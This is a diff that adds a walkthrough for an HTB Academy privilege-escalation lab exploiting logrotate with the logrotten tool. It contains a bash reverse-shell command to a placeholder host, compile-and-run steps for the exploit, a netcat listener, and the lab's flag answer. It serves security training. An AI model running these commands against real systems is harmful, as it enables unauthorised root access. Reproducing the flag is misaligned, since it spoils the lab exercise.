@@ -159,4 +159,15 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Escalate the privileges and submit the contents of flag.txt as the answer.
 
-* 
+* Download the VPN file from the HTB Academy webpage
+* Open your VM and go to your Downloads page from the terminal
+* Run the command " openvpn academy-regular.ovpn " (if it doesnt work try running the same command with sudo)
+* Use the user and password given by HTB and then SSH to the target system spawned for you by running this command "ssh htb-student@\<ip given>\"
+* Run command " find / -name "\*.log" 2>/dev/null " to look for possible writeable .log documents, in this case you will find the " access.log " right in our folder
+* Write a reverse shell command into a payload file, something like " echo 'bash -i >& /dev/tcp/\<your ip>/\<your port number> 0>&1' > payload.sh " and leave it ready to use
+* Download or create a document from logrotten github called logrotten.c and then compile it with a command like " gcc logrotten.c -o logrotten "
+* Run Command on another terminal as " nc -nlvp \<your port number> " and wait for the reverse shell to work
+* Trigger logrotate by manipulating the access.log with a command like " echo "hey" > access.log ", you will notice that a copy of the access.log file will pop on your folder
+* Quickly run command " ./logrotten -p ./payload.sh /home/htb-student/backups/access.log ", you will notice after a couple seconds the second terminal getting access as root
+* Run command " cat flag.txt" before the shell closes 
+* HTB{l0G_r0t7t73N_00ps}
